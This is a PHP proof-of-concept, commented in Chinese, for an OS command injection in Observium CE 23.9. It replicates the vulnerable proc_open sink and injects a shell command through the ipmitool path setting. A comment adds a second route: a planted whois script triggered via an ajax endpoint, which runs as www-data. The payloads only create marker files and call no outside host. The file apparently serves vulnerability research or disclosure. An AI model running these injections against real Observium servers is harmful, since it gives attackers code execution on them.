<?php
/**
 * Observium CE 23.9 — OS 命令注入 PoC
 *
 * 漏洞：管理员在 Web UI「Settings → System Path」配置的系统工具路径
 *      （whois/mtr/nmap/ipmitool/virsh/wmic/rrdtool）被直接拼进 shell 命令，
 *      经 external_exec() -> proc_open('exec ' . $command) 执行，无过滤。
 *
 * 两条利用路径：
 *   A) whois 路径（有 is_executable 校验，只能指向可执行文件/脚本）
 *      - 攻击者写一个恶意脚本（如 /opt/observium/whois_pwn.sh），
 *      - 通过 Web Settings -> System Path 把 whois 指向它（config 表 serialize 存储），
 *      - 触发 GET /ajax/entity_popup.php?entity_type=ip&entity_id=<IP>
 *      - 以 www-data 执行脚本 -> RCE
 *   B) ipmitool/virsh/wmic/rrdtool 路径（无 is_executable 校验，可注入任意 shell 元字符）
 *      - 直接注入 `touch /tmp/x #` 之类命令 -> 完整命令注入
 *
 * 本文件演示 B 的 sink 复刻（本机以 PHP 执行，等价 poller 以 root 运行的场景）。
 */

function external_exec($command) {
    $command = trim($command);
    if ($command === '') return '';
    $descriptorspec = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    // 关键：proc_open 传字符串时经 /bin/sh -c 执行，"exec " 为 shell 内建
    $process = proc_open('exec ' . $command, $descriptorspec, $pipes);
    if (!is_resource($process)) return false;
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    return $stdout;
}

// ---- 攻击者可控的系统路径（管理员可改，ipmitool 无 is_executable 校验）----
$config_ipmitool = 'touch /tmp/observium_cmd_injection_poc #';

// ---- 复现 sink：ipmitool 路径 + 固定后缀（ipmi.inc.php:52）----
$out = external_exec($config_ipmitool . ' sensor 2>/dev/null');
echo "stdout=[" . $out . "]\n";
echo file_exists('/tmp/observium_cmd_injection_poc')
    ? "[+] 命令注入成功：/tmp/observium_cmd_injection_poc 已创建\n"
    : "[-] 失败\n";

/*
 * 方式 A 的 Web 触发 PoC（恶意脚本，放 /opt/observium/ 而非 /tmp，因 Apache PrivateTmp）：
 *
 *   cat > /opt/observium/whois_pwn.sh <<'SH'
 *   #!/bin/sh
 *   echo "WEB_RCE_OK uid=$(id -u)" > /tmp/obs_web_rce_marker.txt
 *   echo "WEB_RCE_OK uid=$(id -u)"
 *   SH
 *   chmod 755 /opt/observium/whois_pwn.sh
 *
 * 再把 whois 路径写为 /opt/observium/whois_pwn.sh（config 表 serialize 存储），
 * 触发后 external_exec 输出 "WEB_RCE_OK uid=33"（www-data），标记文件创建成功。
 */
